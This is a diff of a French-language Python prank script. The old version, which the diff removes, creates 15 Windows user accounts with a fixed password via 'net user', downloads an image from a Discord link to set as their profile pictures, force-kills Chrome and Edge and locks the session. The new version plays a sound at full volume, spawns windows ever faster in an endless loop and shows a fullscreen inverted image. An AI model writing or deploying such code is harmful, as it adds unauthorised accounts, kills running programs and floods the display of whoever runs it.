@@ -1,95 +1,75 @@
-import ctypes
-import os
-import time
-import shutil
-import urllib.request
-import webbrowser
 import tkinter as tk
-import subprocess
+from PIL import Image, ImageTk, ImageOps
+import pygame
+import threading
+import time
 
-# 1. Ajouter plusieurs utilisateurs avec le mot de passe "pipi" et le nom de compte "Nox on top"
-def add_users():
-    for i in range(1, 16):  # Ajouter 15 utilisateurs
-        username = f"Nox on top {i}"
-        password = "pipi"
-        try:
-            os.system(f'net user "{username}" {password} /add')
-            print(f"Utilisateur {username} ajouté.")
-        except Exception as e:
-            print(f"Erreur lors de l'ajout de l'utilisateur {username}: {e}")
 
-# 2. Changer la photo de profil
-def change_profile_picture():
-    image_url = "https://cdn.discordapp.com/attachments/1339570046338596966/1343259645585784903/IMG_1568.png?ex=67bc9f88&is=67bb4e08&hm=0948002f851ce1ebb74dfa8eda85d867700ce8f4be9b6c9d29ae48fc8ccb9b2f&"
-    image_path = "C:\\Users\\Public\\profile_image.png"  # Emplacement temporaire pour l'image
+pygame.mixer.init()
 
-    # Télécharger l'image
-    urllib.request.urlretrieve(image_url, image_path)
+def jouer_son():
+    pygame.mixer.music.load("son.mp3")
+    pygame.mixer.music.set_volume(1.0)  # Volume au maximum
+    pygame.mixer.music.play()
 
-    # Déplacer l'image dans le dossier des photos de profil pour chaque utilisateur
-    for i in range(1, 16):  # Appliquer à 15 utilisateurs
-        username = f"Nox on top {i}"
-        destination = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\AccountPictures\\user.bmp"
-        try:
-            shutil.copy(image_path, destination)
-            print(f"Photo de profil pour {username} changée avec succès.")
-        except Exception as e:
-            print(f"Erreur lors du changement de la photo de profil pour {username}: {e}")
+def creer_fenetre(duree=1000):
+    """Crée une nouvelle fenêtre et réduit progressivement l'intervalle d'apparition."""
+    fenetre = tk.Toplevel()
+    fenetre.title("Image Infinie")
 
-    # Supprimer l'image temporaire
-    os.remove(image_path)
+    image = Image.open("image.jpg").resize((600, 600))
+    photo = ImageTk.PhotoImage(image)
 
-# 3. Ouvrir des pages Internet avec l'URL spécifiée
-def open_infinite_tabs(url):
-    for _ in range(10):  # Limité à 10 ouvertures pour éviter d'empêcher la machine de fonctionner
-        webbrowser.open(url)
-        time.sleep(0.5)  # Ajouter un délai entre chaque ouverture pour ne pas saturer le système
+    label = tk.Label(fenetre, image=photo)
+    label.image = photo
+    label.pack()
 
-# 4. Fermer tous les onglets après 15 secondes
-def close_browser_tabs():
-    # Fermer tous les processus Chrome (ou autre navigateur)
-    try:
-        os.system("taskkill /F /IM chrome.exe")  # Pour Chrome
-        os.system("taskkill /F /IM msedge.exe")  # Pour Microsoft Edge
-        print("Tous les onglets ont été fermés.")
-    except Exception as e:
-        print(f"Erreur lors de la fermeture des onglets: {e}")
+    
+    nouveau_delai = max(100, duree - 100)
+    fenetre.after(nouveau_delai, lambda: creer_fenetre(nouveau_delai))
 
-# 5. Afficher une boîte de texte "Bien joué ! Ton pc a survécu !"
-def show_success_message():
-    root = tk.Tk()
-    root.title("Message")
-    label = tk.Label(root, text="Bien joué ! Ton pc a survécu !", font=("Arial", 24))
-    label.pack(padx=20, pady=20)
-    button = tk.Button(root, text="OK", command=root.destroy, font=("Arial", 12))
-    button.pack(pady=10)
-    root.mainloop()
+def lancer_images_infinies():
+    """Lance les fenêtres infinies après 5 secondes."""
+    time.sleep(5)
+    creer_fenetre(1000)  
 
-# 6. Verrouiller la session après 3 secondes
-def lock_session():
-    time.sleep(3)  # Attendre 3 secondes avant de verrouiller
-    ctypes.windll.user32.LockWorkStation()
-
-# Script principal
-def main():
-    # 1. Ajouter les utilisateurs
-    add_users()
-
-    # 2. Changer la photo de profil pour chaque utilisateur
-    change_profile_picture()
-
-    # 3. Ouvre des onglets internet avec l'image en fond
-    open_infinite_tabs("https://cdn.discordapp.com/attachments/1339570046338596966/1343259645585784903/IMG_1568.png?ex=67bc9f88&is=67bb4e08&hm=0948002f851ce1ebb74dfa8eda85d867700ce8f4be9b6c9d29ae48fc8ccb9b2f&")
-
-    # 4. Attendre 15 secondes avant de fermer les onglets
+def afficher_image_inverse():
+    """Affiche l’image en plein écran avec couleurs inversées après 15 secondes."""
     time.sleep(15)
-    close_browser_tabs()
 
-    # 5. Afficher le message "Bien joué ! Ton pc a survécu !"
-    show_success_message()
+    root_inverse = tk.Tk()
+    root_inverse.attributes("-fullscreen", True)
+    root_inverse.configure(bg="black")
 
-    # 6. Verrouiller la session après 3 secondes
-    lock_session()
+    image = Image.open("image.jpg").convert("RGB")
+    image = ImageOps.invert(image)  
+    image = image.resize((root_inverse.winfo_screenwidth(), root_inverse.winfo_screenheight()))
 
-if __name__ == "__main__":
-    main()
+    photo = ImageTk.PhotoImage(image)
+    label = tk.Label(root_inverse, image=photo)
+    label.image = photo
+    label.pack()
+
+    root_inverse.mainloop()
+
+
+jouer_son()
+
+
+threading.Thread(target=lancer_images_infinies, daemon=True).start()
+
+
+threading.Thread(target=afficher_image_inverse, daemon=True).start()
+
+
+root = tk.Tk()
+root.title("Alex Novia le Staffer")
+
+image = Image.open("image.jpg").resize((600, 600))
+photo = ImageTk.PhotoImage(image)
+
+label_image = tk.Label(root, image=photo)
+label_image.image = photo
+label_image.pack()
+
+root.mainloop()
